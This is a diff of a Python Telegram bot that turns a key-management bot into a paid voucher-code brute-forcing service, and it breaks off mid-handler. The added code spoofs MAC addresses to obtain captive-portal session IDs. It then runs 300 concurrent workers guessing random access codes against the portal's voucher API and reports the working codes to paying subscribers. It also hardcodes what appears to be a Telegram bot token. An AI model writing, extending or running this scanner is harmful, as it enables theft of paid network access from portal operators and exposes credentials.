@@ -1,743 +1,719 @@
+#!/usr/bin/env python3
 import os
-import sqlite3
-import requests
-import base64
-import telebot
-import html  # Code ရဲ့ အပေါ်ဆုံးမှာ ရှိနေပါစေ
-from telebot import types
-import threading
-from flask import Flask, request, abort
-from datetime import datetime
+import re
+import sys
+import time
+import string
+import random
+import asyncio
+import aiohttp
+import json
+from datetime import datetime, timedelta
+from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse
 
-# ================= [ FLASK WEB SERVER FOR WEBHOOK & RENDER ] =================
-SPECIAL_RESELLERS = {}
-app = Flask('')
+from telebot.async_telebot import AsyncTeleBot
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 
-# Environment Variable မှတစ်ဆင့် Render URL ကို ယူမည် (ဥပမာ- https://your-app.onrender.com)
-PUBLIC_URL = os.environ.get("PUBLIC_URL") 
+# ---------------------- CONFIGURATION ----------------------
+BOT_TOKEN = "8738088692:AAGwBsqcXomy1oFUIXGijCwMRn0hwEkwuIQ"
+ADMIN_ID = 5376544115
+DATA_FILE = "bot_data.json"
 
-@app.route('/')
-def home():
-    return "Bot is running via Webhook 24/7!"
+# Scanner Limits
+PER_USER_CONCURRENCY = 300 
+PER_SESSION_MAX = 90
+TIMEOUT_SEC = 10
 
-# Telegram Webhook မှ ပို့လိုက်သော Update များကို လက်ခံမည့် Route
-@app.route(f'/{os.environ.get("BOT_TOKEN")}', methods=['POST'])
-def webhook():
-    if request.headers.get('content-type') == 'application/json':
-        json_string = request.get_data().decode('utf-8')
-        update = telebot.types.Update.de_json(json_string)
-        bot.process_new_updates([update])
-        return ''
-    else:
-        abort(403)
+# ---------------------- DATA PERSISTENCE ----------------------
+class DataManager:
+    def __init__(self, file_path):
+        self.file_path = file_path
+        self.data = {
+            "authorized_users": {},   # user_id: {"expiry": expiry_str, "daily_limit": int}
+            "user_daily_hits": {},    # user_id: {date_str: hit_count}
+            "users": {}               # user_id: { "urls": [], "tried_codes": [], "success_codes": [], "settings": {...} }
+        }
+        self.load()
 
-# ================= [ CONFIGURATION ] =================
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ADMIN_ID = int(os.environ.get("TGC_ID")) if os.environ.get("TGC_ID") else None
-DEFAULT_LIMIT = 5  
+    def load(self):
+        if os.path.exists(self.file_path):
+            try:
+                with open(self.file_path, 'r') as f:
+                    loaded_data = json.load(f)
+                    for key in self.data:
+                        if key in loaded_data:
+                            self.data[key] = loaded_data[key]
+            except Exception as e:
+                print(f"Error loading data: {e}")
+        self.save()
 
-GITHUB_TOKEN = os.environ.get("GH_TOKEN")
-REPO_OWNER = "GodForYou2" 
-REPO_NAME = "Approval" 
-FILE_PATH = "key.txt" 
-RESELLER_FILE_PATH = "resellers.txt" 
+    def save(self):
+        try:
+            with open(self.file_path, 'w') as f:
+                json.dump(self.data, f, indent=4)
+        except Exception as e:
+            print(f"Error saving data: {e}")
 
-bot = telebot.TeleBot(BOT_TOKEN)
+    def is_authorized(self, user_id):
+        if user_id == ADMIN_ID:
+            return True
+        uid = str(user_id)
+        if uid in self.data["authorized_users"]:
+            user_info = self.data["authorized_users"][uid]
+            expiry_str = user_info.get("expiry", "Expired")
+            if expiry_str == "lifetime":
+                return True
+            try:
+                expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+                if datetime.now() < expiry_date:
+                    return True
+                else:
+                    self.deauthorize(user_id)
+                    return False
+            except:
+                return False
+        return False
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DB_FILE = os.path.join(BASE_DIR, "keys_management.db")
+    def get_user_info(self, user_id):
+        if user_id == ADMIN_ID:
+            return {"expiry": "♾️ Lifetime Admin", "daily_limit": "♾️ Unlimited"}
+        uid = str(user_id)
+        return self.data["authorized_users"].get(uid, {"expiry": "Expired", "daily_limit": 0})
 
-# --- GitHub မှ Key ရော Reseller ပါ ဒေတာပြန်ဆွဲယူမည့် (Auto-Restore) စနစ် ---
-def pull_data_from_github():
-    headers = {}
-    if GITHUB_TOKEN:
-        headers["Authorization"] = f"token {GITHUB_TOKEN}"
-    headers["Accept"] = "application/vnd.github.v3+json"
+    def authorize(self, user_id, days, daily_limit):
+        uid = str(user_id)
+        if days == "lifetime":
+            expiry_str = "lifetime"
+        else:
+            expiry_date = datetime.now() + timedelta(days=int(days))
+            expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
+        
+        self.data["authorized_users"][uid] = {
+            "expiry": expiry_str,
+            "daily_limit": int(daily_limit)
+        }
+        self.save()
+        return expiry_str
+
+    def deauthorize(self, user_id):
+        uid = str(user_id)
+        if uid in self.data["authorized_users"]:
+            del self.data["authorized_users"][uid]
+        if uid in self.data["users"]:
+            del self.data["users"][uid]
+        self.save()
+
+    def check_and_add_hit(self, user_id):
+        if user_id == ADMIN_ID:
+            return True
+        uid = str(user_id)
+        today = datetime.now().strftime("%Y-%m-%d")
+        user_info = self.get_user_info(user_id)
+        max_limit = user_info.get("daily_limit", 10)
+
+        if uid not in self.data["user_daily_hits"]:
+            self.data["user_daily_hits"][uid] = {}
+        
+        current_hits = self.data["user_daily_hits"][uid].get(today, 0)
+        if current_hits >= max_limit:
+            return False
+            
+        self.data["user_daily_hits"][uid][today] = current_hits + 1
+        self.save()
+        return True
+
+    def get_today_hits(self, user_id):
+        uid = str(user_id)
+        today = datetime.now().strftime("%Y-%m-%d")
+        if uid in self.data["user_daily_hits"]:
+            return self.data["user_daily_hits"][uid].get(today, 0)
+        return 0
+
+    def add_user_url(self, user_id, url):
+        uid = str(user_id)
+        if uid not in self.data["users"]:
+            self.data["users"][uid] = {"urls": [], "tried_codes": [], "success_codes": [], "settings": {"char_set": "012345678", "code_len": 6}}
+        
+        if url not in self.data["users"][uid]["urls"]:
+            self.data["users"][uid]["urls"].append(url)
+            self.save()
+            return True
+        return False
+
+    def get_user_data(self, user_id):
+        uid = str(user_id)
+        if uid not in self.data["users"]:
+            self.data["users"][uid] = {"urls": [], "tried_codes": [], "success_codes": [], "settings": {"char_set": "012345678", "code_len": 6}}
+        else:
+            if "urls" not in self.data["users"][uid]:
+                self.data["users"][uid]["urls"] = []
+            if "tried_codes" not in self.data["users"][uid]:
+                self.data["users"][uid]["tried_codes"] = []
+            if "success_codes" not in self.data["users"][uid]:
+                self.data["users"][uid]["success_codes"] = []
+            if "settings" not in self.data["users"][uid]:
+                self.data["users"][uid]["settings"] = {"char_set": "012345678", "code_len": 6}
+        return self.data["users"][uid]
+
+    def update_user_tried(self, user_id, code):
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            if code not in self.data["users"][uid]["tried_codes"]:
+                self.data["users"][uid]["tried_codes"].append(code)
+                if len(self.data["users"][uid]["tried_codes"]) > 10000:
+                    self.data["users"][uid]["tried_codes"] = self.data["users"][uid]["tried_codes"][-10000:]
+                self.save()
+
+    def add_success_code(self, user_id, code):
+        uid = str(user_id)
+        self.get_user_data(user_id) # Ensure structure exists
+        if code not in self.data["users"][uid]["success_codes"]:
+            self.data["users"][uid]["success_codes"].append(code)
+            self.save()
+
+    def clear_success_codes(self, user_id):
+        uid = str(user_id)
+        if uid in self.data["users"] and "success_codes" in self.data["users"][uid]:
+            self.data["users"][uid]["success_codes"] = []
+            self.save()
+
+    def clear_user_urls(self, user_id):
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            self.data["users"][uid]["urls"] = []
+            self.save()
+
+    def update_user_settings(self, user_id, setting_key, setting_value):
+        uid = str(user_id)
+        if uid in self.data["users"] and "settings" in self.data["users"][uid]:
+            self.data["users"][uid]["settings"][setting_key] = setting_value
+            self.save()
+
+data_manager = DataManager(DATA_FILE)
+
+# ---------------------- USER SESSION MANAGER ----------------------
+class UserSession:
+    def __init__(self, user_id):
+        self.user_id = user_id
+        self.stop_event = asyncio.Event()
+        self.scan_task = None
+        self.stats = {
+            "total_tried": 0,
+            "total_hits": 0,
+            "current_code": "----",
+            "start_time": 0
+        }
+        self.status_msg_id = None
+        self.current_url_index = 0
+        self.state = None 
+        
+    def reset_stats(self):
+        self.stats = {
+            "total_tried": 0,
+            "total_hits": 0,
+            "current_code": "----",
+            "start_time": time.time()
+        }
+        self.stop_event.clear()
+
+user_sessions = {}
+
+def get_session(user_id) -> UserSession:
+    if user_id not in user_sessions:
+        user_sessions[user_id] = UserSession(user_id)
+    return user_sessions[user_id]
+
+# ---------------------- SCANNING ENGINE ----------------------
+bot = AsyncTeleBot(BOT_TOKEN)
+
+def generate_random_mac():
+    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
+
+async def get_sid_from_gateway(session, portal_url):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    }
+    try:
+        u = urlparse(portal_url)
+        query = parse_qs(u.query)
+        query['mac'] = [generate_random_mac()]
+        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
+        
+        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
+            body = await r2.text()
+            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
+            if match:
+                final_url = urljoin(spoofed_url, match.group(1))
+                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
+                    final_url = str(r3.url)
+            else:
+                final_url = str(r2.url)
+            
+            parsed_query = parse_qs(urlparse(final_url).query)
+            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
+            return sid
+    except Exception as e:
+        print(f"Error getting SID from gateway {portal_url}: {e}")
+        return None
+
+async def worker_task(user_id, app_session):
+    session = get_session(user_id)
+    u_data = data_manager.get_user_data(user_id)
+    urls = u_data["urls"]
+    if not urls: 
+        return
+
+    char_set = u_data["settings"]["char_set"]
+    code_len = u_data["settings"]["code_len"]
+    tried_codes = set(u_data["tried_codes"])
     
-    # 1. Pull Keys Data
-    try:
-        url_keys = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
-        res_k = requests.get(url_keys, headers=headers)
-        file_content_keys = None
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
+    }
+    
+    my_sid = None
+    use_count = 0
+    
+    while not session.stop_event.is_set():
+        if not data_manager.is_authorized(user_id):
+            session.stop_event.set()
+            await bot.send_message(user_id, "⚠️ <b>သင့်ရဲ့ သက်တမ်းကုန်ဆုံးသွားသောကြောင့် Scanner ကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
+            break
+
+        current_url = urls[session.current_url_index % len(urls)]
+        base_url = f"{urlparse(current_url).scheme}://{urlparse(current_url).netloc}"
+
+        if my_sid is None or use_count >= PER_SESSION_MAX:
+            my_sid = await get_sid_from_gateway(app_session, current_url)
+            if not my_sid:
+                session.current_url_index += 1
+                await asyncio.sleep(0.1)
+                continue
+            use_count = 0
+
+        code = ''.join(random.choices(char_set, k=code_len))
+        if code in tried_codes: 
+            continue
+        tried_codes.add(code)
+        data_manager.update_user_tried(user_id, code)
         
-        if res_k.status_code == 200:
-            content_b64 = res_k.json().get("content", "")
-            if content_b64:
-                file_content_keys = base64.b64decode(content_b64).decode("utf-8")
-        else:
-            raw_url_keys = f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/{FILE_PATH}"
-            res_raw_k = requests.get(raw_url_keys)
-            if res_raw_k.status_code == 200:
-                file_content_keys = res_raw_k.text
-
-        if file_content_keys:
-            conn = sqlite3.connect(DB_FILE)
-            cursor = conn.cursor()
-            cursor.execute("DELETE FROM auth_keys")
-            for line in file_content_keys.split("\n"):
-                if " | " in line:
-                    parts = [p.strip() for p in line.split("|")]
-                    created_date = datetime.now().strftime("%Y-%m-%d")
-                    if len(parts) == 6:
-                        try: owner_id = int(parts[4])
-                        except: owner_id = ADMIN_ID
-                        created_date = parts[5]
-                        cursor.execute("""
-                            INSERT OR IGNORE INTO auth_keys (target_id, key_string, unit_val, duration_type, added_by, created_at) 
-                            VALUES (?, ?, ?, ?, ?, ?)
-                        """, (parts[0], parts[1], parts[2], parts[3], owner_id, created_date))
-                    elif len(parts) == 5:
-                        try: owner_id = int(parts[4])
-                        except: owner_id = ADMIN_ID
-                        cursor.execute("""
-                            INSERT OR IGNORE INTO auth_keys (target_id, key_string, unit_val, duration_type, added_by, created_at) 
-                            VALUES (?, ?, ?, ?, ?, ?)
-                        """, (parts[0], parts[1], parts[2], parts[3], owner_id, created_date))
-                    elif len(parts) == 4:
-                        cursor.execute("""
-                            INSERT OR IGNORE INTO auth_keys (target_id, key_string, unit_val, duration_type, added_by, created_at) 
-                            VALUES (?, ?, ?, ?, ?, ?)
-                        """, (parts[0], parts[1], parts[2], parts[3], ADMIN_ID, created_date))
-            conn.commit()
-            conn.close()
-            print("[+] Success: Keys data restored.")
-    except Exception as e: print(f"[-] Keys Pull Exception: {str(e)}")
-
-    # 2. Pull Resellers Data
-    try:
-        file_content_resellers = None
-        url_resellers = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{RESELLER_FILE_PATH}"
-        res_r = requests.get(url_resellers, headers=headers)
-        
-        if res_r.status_code == 200:
-            content_b64 = res_r.json().get("content", "")
-            if content_b64:
-                file_content_resellers = base64.b64decode(content_b64).decode("utf-8")
-        else:
-            raw_url_resellers = f"https://raw.githubusercontent.com/{REPO_OWNER}/{REPO_NAME}/main/{RESELLER_FILE_PATH}"
-            res_raw_r = requests.get(raw_url_resellers)
-            if res_raw_r.status_code == 200:
-                file_content_resellers = res_raw_r.text
-
-        if file_content_resellers:
-            conn = sqlite3.connect(DB_FILE)
-            cursor = conn.cursor()
+        session.stats["current_code"] = code
+        try:
+            api_url = f"{base_url}/api/auth/voucher/"
+            payload = {'accessCode': code, 'sessionId': my_sid, 'apiVersion': 1}
             
-            cursor.execute("DELETE FROM users WHERE tg_id != ?", (ADMIN_ID,))
-            
-            lines = file_content_resellers.split("\n")
-            for line in lines:
-                line = line.strip()
-                if not line: continue
+            async with app_session.post(api_url, json=payload, headers=headers, timeout=5, ssl=False) as r:
+                session.stats["total_tried"] += 1
+                use_count += 1
+                res_text = (await r.text()).lower()
                 
-                if "|" in line:
-                    parts = [p.strip() for p in line.split("|") if p.strip()]
-                    if len(parts) == 3:
-                        clean_id = parts[0].replace(" ", "")
-                        if clean_id.isdigit():
-                            target_tg_id = int(clean_id)
-                            user_role = 'admin' if target_tg_id == ADMIN_ID else 'reseller'
-                            try: r_limit = int(parts[2])
-                            except: r_limit = DEFAULT_LIMIT
-                            cursor.execute("INSERT OR REPLACE INTO users (tg_id, username, role, daily_limit) VALUES (?, ?, ?, ?)", (target_tg_id, parts[1], user_role, r_limit))
-                    elif len(parts) == 2:
-                        clean_id = parts[0].replace(" ", "")
-                        if clean_id.isdigit():
-                            target_tg_id = int(clean_id)
-                            user_role = 'admin' if target_tg_id == ADMIN_ID else 'reseller'
-                            cursor.execute("INSERT OR REPLACE INTO users (tg_id, username, role, daily_limit) VALUES (?, ?, ?, ?)", (target_tg_id, parts[1], user_role, DEFAULT_LIMIT))
+                if '"success":true' in res_text:
+                    if data_manager.check_and_add_hit(user_id):
+                        session.stats["total_hits"] += 1
+                        data_manager.add_success_code(user_id, code) # Save found success code
+                        await bot.send_message(user_id, f"✅ <b>FOUND SUCCESS CODE:</b> <code>{code}</code>", parse_mode="HTML")
+                    else:
+                        session.stop_event.set()
+                        await bot.send_message(user_id, f"🚫 <b>ယနေ့အတွက် Success Code ရှာဖွေနိုင်မှု ကန့်သတ်ချက် ပြည့်သွားပြီဖြစ်၍ စကင်နာကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
+                        break
+                
+                if "request limited" in res_text :
+                    my_sid = None
+        except Exception as e:
+            my_sid = None
+            await asyncio.sleep(0.1)
+
+async def dashboard_updater(user_id):
+    session = get_session(user_id)
+    while not session.stop_event.is_set():
+        if session.status_msg_id:
+            elapsed = time.time() - session.stats["start_time"]
+            speed = session.stats["total_tried"] / elapsed if elapsed > 0 else 0
+            current_time_str = datetime.now().strftime("%I:%M:%S %p")
+            today_hits = data_manager.get_today_hits(user_id)
+            user_info = data_manager.get_user_info(user_id)
+            max_limit = user_info.get("daily_limit", 10)
             
-            cursor.execute("INSERT OR REPLACE INTO users (tg_id, username, role, daily_limit) VALUES (?, ?, 'admin', 999999)", (ADMIN_ID, 'Main_Admin'))
-            conn.commit()
-            conn.close()
-            print("[+] Success: Resellers database updated smoothly.")
-        else:
-            print("[-] Error: Could not fetch resellers data from GitHub.")
-    except Exception as e: print(f"[-] Resellers Pull Exception: {str(e)}")
+            text = (
+                f"🔥 <b>ALADDIN IMMORTAL SCANNER V11</b> 🔥\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"⏰ <b>🕒 LIVE CLOCK:</b> <code>{current_time_str}</code>\n"
+                f"🚀 <b>SPEED:</b> {speed:.1f} c/s\n"
+                f"🏹 <b>TRIED:</b> {session.stats['total_tried']:,}\n"
+                f"🎯 <b>HITS (TODAY):</b> {today_hits}/{max_limit} FOUND\n"
+                f"🔑 <b>CURRENT TRY:</b> <code>{session.stats['current_code']}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"ℹ️ <i>Results will be sent instantly. You can pause anytime.</i>"
+            )
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton(text="🛑 STOP & PAUSE SCANNER", callback_data="stop_scan"))
+            try:
+                await bot.edit_message_text(chat_id=user_id, message_id=session.status_msg_id, text=text, reply_markup=markup, parse_mode="HTML")
+            except Exception as e:
+                session.status_msg_id = None
+        await asyncio.sleep(3)
 
-# --- Database Setup ---
-def init_db():
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute('''CREATE TABLE IF NOT EXISTS auth_keys (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        target_id TEXT UNIQUE,
-        key_string TEXT, 
-        unit_val TEXT, 
-        duration_type TEXT, 
-        added_by INTEGER,
-        created_at TEXT
-    )''')
-    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
-        tg_id INTEGER PRIMARY KEY, 
-        username TEXT, 
-        role TEXT,
-        daily_limit INTEGER DEFAULT 5
-    )''')
-    cursor.execute("INSERT OR IGNORE INTO users (tg_id, username, role, daily_limit) VALUES (?, ?, ?, ?)", (ADMIN_ID, 'Main_Admin', 'admin', 999999))
-    
-    try: cursor.execute("ALTER TABLE auth_keys ADD COLUMN created_at TEXT")
-    except: pass
-    try: cursor.execute("ALTER TABLE users ADD COLUMN daily_limit INTEGER DEFAULT 5")
-    except: pass
-        
-    conn.commit()
-    conn.close()
+async def main_scanner_task(user_id):
+    connector = aiohttp.TCPConnector(limit=PER_USER_CONCURRENCY,limit_per_host=0, ttl_dns_cache=300, ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as app_session:
+        tasks = [asyncio.create_task(dashboard_updater(user_id))]
+        tasks.extend([asyncio.create_task(worker_task(user_id, app_session)) for _ in range(PER_USER_CONCURRENCY)])
+        await asyncio.gather(*tasks)
 
-init_db()
-pull_data_from_github()
+# ---------------------- BOT KEYBOARD MENUS ----------------------
 
-# --- GitHub Auto Sync Functions ---
-def sync_db_to_github():
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT target_id, key_string, unit_val, duration_type, added_by, created_at FROM auth_keys")
-        rows = cursor.fetchall()
-        conn.close()
-        
-        content_lines = []
-        for row in rows:
-            tid = row[0] if row[0] else "NoID"
-            kstr = row[1] if row[1] else "NoKey"
-            uval = row[2] if row[2] else "0"
-            dtype = row[3] if row[3] else "d"
-            owner = row[4] if row[4] else str(ADMIN_ID)
-            cdate = row[5] if row[5] else datetime.now().strftime("%Y-%m-%d")
-            content_lines.append(f"{tid} | {kstr} | {uval} | {dtype} | {owner} | {cdate}")
-            
-        file_content = "\n".join(content_lines)
-        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
-        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
-        
-        res = requests.get(url, headers=headers)
-        sha = res.json().get('sha') if res.status_code == 200 else None
-        payload = {
-            "message": "Bot Auto Sync Keys with Date Limits",
-            "content": base64.b64encode(file_content.encode('utf-8')).decode('utf-8')
-        }
-        if sha: payload["sha"] = sha
-        requests.put(url, headers=headers, json=payload)
-        return True
-    except Exception as e:
-        print(f"[-] Keys Sync Error: {str(e)}")
-        return False
-
-def sync_resellers_to_github():
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT tg_id, username, daily_limit FROM users")
-        rows = cursor.fetchall()
-        conn.close()
-        
-        content_lines = []
-        for row in rows:
-            content_lines.append(f"{row[0]} | {row[1]} | {row[2]}")
-            
-        file_content = "\n".join(content_lines)
-        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{RESELLER_FILE_PATH}"
-        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
-        
-        res = requests.get(url, headers=headers)
-        sha = res.json().get('sha') if res.status_code == 200 else None
-        payload = {
-            "message": "Bot Auto Sync Resellers List with custom limits",
-            "content": base64.b64encode(file_content.encode('utf-8')).decode('utf-8')
-        }
-        if sha: payload["sha"] = sha
-        requests.put(url, headers=headers, json=payload)
-        return True
-    except Exception as e:
-        print(f"[-] Resellers Sync Error: {str(e)}")
-        return False
-
-# --- Roles & Permissions Checks ---
-def is_admin(user_id): 
-    return user_id == ADMIN_ID
-
-def is_reseller(user_id):
-    if user_id == ADMIN_ID: return True
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT role FROM users WHERE tg_id = ? AND role = 'reseller'", (user_id,))
-    res = cursor.fetchone()
-    conn.close()
-    return res is not None
-
-def get_key_owner_by_id(target_id_str):
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT added_by FROM auth_keys WHERE target_id = ?", (target_id_str,))
-    result = cursor.fetchone()
-    conn.close()
-    return result[0] if result else None
-
-def get_user_name(user_id):
-    if user_id == ADMIN_ID: return "Main_Admin"
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT username FROM users WHERE tg_id = ?", (user_id,))
-    res = cursor.fetchone()
-    conn.close()
-    return res[0] if res else f"Unknown ({user_id})"
-
-def get_reseller_daily_limit(user_id):
-    if user_id == ADMIN_ID: return 999999
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT daily_limit FROM users WHERE tg_id = ?", (user_id,))
-    res = cursor.fetchone()
-    conn.close()
-    return res[0] if res else DEFAULT_LIMIT
-
-def get_today_added_count(user_id):
-    today_str = datetime.now().strftime("%Y-%m-%d")
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT COUNT(*) FROM auth_keys WHERE added_by = ? AND created_at = ?", (user_id, today_str))
-    count = cursor.fetchone()[0]
-    conn.close()
-    return count
-
-# --- Custom Menu Keyboard ---
-def get_main_keyboard(user_id):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add("➕ Add Key", "🔑 My Keys", "✏️ Edit Key", "🗑 Delete Key")
-    if is_admin(user_id):
-        markup.add("👤 Create Reseller", "📊 Reseller List", "🗑 Delete Reseller", "🌐 View All Keys")
+def get_user_keyboard(user_id):
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add(KeyboardButton("🔗 ADD PORTAL URL"), KeyboardButton("📄 MY URLS"))
+    markup.add(KeyboardButton("⚙️ SETUP CONFIG MOD"), KeyboardButton("🚀 START SCAN"))
+    markup.add(KeyboardButton("📄 MY SUCCESS CODES")) # New Keyboard Button added here
+    if user_id == ADMIN_ID:
+        markup.add(KeyboardButton("🔑 ADMIN PANEL"))
     return markup
 
-user_states = {}
-reseller_temp_data = {}
-MENU_BUTTONS = ["➕ Add Key", "🔑 My Keys", "✏️ Edit Key", "🗑 Delete Key", "👤 Create Reseller", "📊 Reseller List", "🗑 Delete Reseller", "🌐 View All Keys"]
+def get_unauth_keyboard():
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    markup.add(KeyboardButton("🛒 Access Key ဝယ်ယူရန်"))
+    markup.add(KeyboardButton("💵 Ngwe Lwe Pyay Sar Po Yan"))
+    return markup
 
-# ================= [ BOT HANDLERS ] =================
+def get_admin_panel_keyboard():
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    markup.add(KeyboardButton("👥 Admin ခွင့်ပြုပေးထားသော User များ"))
+    markup.add(KeyboardButton("🚫 ခွင့်ပြုထားသော user များအား ပယ်ဖျက်ရန်"))
+    markup.add(KeyboardButton("🔙 BACK TO MAIN"))
+    return markup
 
 @bot.message_handler(commands=['start'])
-def cmd_start(message):
+async def cmd_start(message):
     user_id = message.from_user.id
-    user_states[user_id] = None 
-    pull_data_from_github()
-    if not is_reseller(user_id):
-        bot.reply_to(message, "🚫 သင်သည် စနစ်သုံးခွင့်မရှိသေးပါ။ Admin ထံ ခွင့်ပြုချက်တောင်းပါ။")
-        return
-    bot.send_message(message.chat.id, "👋 မင်္ဂလာပါ! အောက်ပါ Menu ခလုတ်များကို အသုံးပြုနိုင်ပါပြီ။", reply_markup=get_main_keyboard(user_id))
+    session = get_session(user_id)
+    session.state = None 
 
-# 1. Create Reseller
-@bot.message_handler(func=lambda msg: msg.text == "👤 Create Reseller" and is_admin(msg.from_user.id))
-def admin_create_reseller(message):
-    user_states[message.from_user.id] = 'waiting_for_reseller_id'
-    bot.reply_to(message, "👤 Reseller အသစ်လုပ်မည့်သူ၏ **Telegram User ID** (ဂဏန်းသီးသန့်) ကို ပို့ပေးပါ-", parse_mode="Markdown")
-
-@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == 'waiting_for_reseller_id' and msg.text not in MENU_BUTTONS)
-def process_reseller_id(message):
-    admin_id = message.from_user.id
-    try:
-        reseller_id = int(message.text.strip())
-        reseller_temp_data[admin_id] = {'id': reseller_id}
-        user_states[admin_id] = 'waiting_for_reseller_name'
-        bot.reply_to(message, f"✍️ ID `{reseller_id}` အတွက် သတ်မှတ်မည့် **Reseller နာမည်** ကို ပို့ပေးပါ-", parse_mode="Markdown")
-    except: 
-        bot.reply_to(message, "❌ မှားယွင်းနေပါသည်။ Telegram ID (ဂဏန်းသီးသန့်) ကိုသာ ပို့ပေးပါ။")
-
-@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == 'waiting_for_reseller_name' and msg.text not in MENU_BUTTONS)
-def process_reseller_name(message):
-    admin_id = message.from_user.id
-    reseller_name = message.text.strip()
-    
-    if admin_id not in reseller_temp_data:
-        bot.reply_to(message, "❌ အချိန်လွန်သွားပါပြီ။ အစမှ ပြန်ဆောက်ပေးပါ။")
-        user_states[admin_id] = None
+    if not data_manager.is_authorized(user_id):
+        await bot.reply_to(
+            message, 
+            "✨ <b>မင်္ဂလာပါခင်ဗျာ</b> ၊ Bot ကို အသုံးပြုခွင့်မရှိသေးပါ ၊ ❌\n\n"
+            "⚠️ <b>👉 ကျေးဇူးပြု၍ အောက်ပါ Menu မှတစ်ဆင့် ဝယ်ယူပါ</b> 👈", 
+            reply_markup=get_unauth_keyboard(),
+            parse_mode="HTML"
+        )
         return
 
-    reseller_temp_data[admin_id]['name'] = reseller_name
-    user_states[admin_id] = 'waiting_for_reseller_limit'
-    bot.reply_to(message, f"📊 နာမည် `_{reseller_name}_` အတွက် တစ်ရက်လျှင် ထည့်သွင်းခွင့်ပြုမည့် **Key အရေအတွက် အကန့်အသတ် (Limit)** ကို ဂဏန်းသီးသန့် ပို့ပေးပါ-", parse_mode="Markdown")
+    user_info = data_manager.get_user_info(user_id)
+    await bot.reply_to(
+        message,
+        f"👋 <b>Welcome back to Premium Aladdin Scanner Mode!</b>\n\n"
+        f"👤 <b>Your ID:</b> <code>{user_id}</code>\n"
+        f"⏳ <b>Valid Until:</b> <code>{user_info['expiry']}</code>\n"
+        f"🎯 <b>Daily Max Limit:</b> <code>{user_info['daily_limit']} Hits</code>\n\n"
+        f"✨ စက်ဝိုင်းစနစ်ဖြင့် စကင်ဖတ်ရန် အောက်ပါ Keyboard ခလုတ်များကို သုံးနိုင်ပါပြီ။",
+        reply_markup=get_user_keyboard(user_id),
+        parse_mode="HTML"
+    )
 
-@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == 'waiting_for_reseller_limit' and msg.text not in MENU_BUTTONS)
-def process_reseller_limit(message):
-    admin_id = message.from_user.id
-    
-    if admin_id not in reseller_temp_data or 'id' not in reseller_temp_data[admin_id]:
-        bot.reply_to(message, "❌ အချက်အလက် မှားယွင်းသွားပါပြီ။ လူသစ်ပြန်ဆောက်ပေးပါ။")
-        user_states[admin_id] = None
-        return
-        
-    try:
-        r_limit = int(message.text.strip())
-        reseller_id = reseller_temp_data[admin_id]['id']
-        reseller_name = reseller_temp_data[admin_id]['name']
-        
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("INSERT OR REPLACE INTO users (tg_id, username, role, daily_limit) VALUES (?, ?, 'reseller', ?)", (reseller_id, reseller_name, r_limit))
-        conn.commit()
-        conn.close()
-        
